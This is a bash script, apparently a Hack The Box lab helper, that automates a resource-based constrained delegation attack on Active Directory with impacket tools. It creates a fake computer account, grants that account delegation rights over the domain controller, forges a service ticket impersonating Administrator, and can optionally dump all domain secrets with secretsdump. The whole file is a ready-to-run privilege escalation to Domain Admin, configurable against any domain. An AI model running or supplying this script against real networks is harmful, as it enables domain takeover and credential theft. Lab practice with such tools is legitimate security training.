#!/usr/bin/env bash
# Support-style RBCD → Domain Admin (HTB lab helper)
#
# Prerequisites: impacket tools, resolvable dc.support.htb (or pass --dc-ip)
#
# Usage:
#   export DOMAIN=support.htb
#   export DC_IP=10.10.10.x
#   export USER=support
#   export PASS='...'
#   export COMPUTER=FAKEPC
#   export COMPUTER_PASS='Password123!'
#   ./rbcd_to_da.sh
#
# Optional: DUMP=1 to run secretsdump after getST

set -euo pipefail

DOMAIN="${DOMAIN:-support.htb}"
DC_IP="${DC_IP:?set DC_IP}"
USER="${USER:?set USER}"
PASS="${PASS:?set PASS}"
COMPUTER="${COMPUTER:-FAKEPC}"
COMPUTER_PASS="${COMPUTER_PASS:-Password123!}"
SPN="${SPN:-cifs/dc.${DOMAIN}}"
IMPERSONATE="${IMPERSONATE:-Administrator}"
DUMP="${DUMP:-0}"

echo "[*] 1/3 addcomputer ${COMPUTER}\$"
impacket-addcomputer "${DOMAIN}/${USER}:${PASS}" -dc-ip "${DC_IP}" \
  -computer-name "${COMPUTER}" -computer-pass "${COMPUTER_PASS}"

echo "[*] 2/3 rbcd write ${COMPUTER}\$ -> DC\$"
impacket-rbcd -delegate-from "${COMPUTER}\$" -delegate-to 'DC$' -action write \
  -dc-ip "${DC_IP}" "${DOMAIN}/${USER}:${PASS}"

echo "[*] 3/3 getST ${IMPERSONATE} @ ${SPN}"
impacket-getST "${DOMAIN}/${COMPUTER}\$:${COMPUTER_PASS}" \
  -spn "${SPN}" -impersonate "${IMPERSONATE}" -dc-ip "${DC_IP}"

# default ccache name from impacket getST
CCACHE="${IMPERSONATE}@$(echo "${SPN}" | tr '/' '_')@${DOMAIN^^}.ccache"
# domain upper may differ; glob latest
if [[ ! -f "${CCACHE}" ]]; then
  CCACHE=$(ls -t ./*"${IMPERSONATE}"*ccache 2>/dev/null | head -1 || true)
fi
if [[ -z "${CCACHE}" || ! -f "${CCACHE}" ]]; then
  echo "[-] could not find ccache in cwd; check getST output"
  exit 1
fi

export KRB5CCNAME="$(pwd)/${CCACHE}"
echo "[+] KRB5CCNAME=${KRB5CCNAME}"

if [[ "${DUMP}" == "1" ]]; then
  echo "[*] secretsdump -k"
  impacket-secretsdump -k -no-pass "dc.${DOMAIN}"
fi

echo "[*] done. Example:"
echo "  export KRB5CCNAME=${KRB5CCNAME}"
echo "  impacket-smbclient -k -no-pass dc.${DOMAIN}"
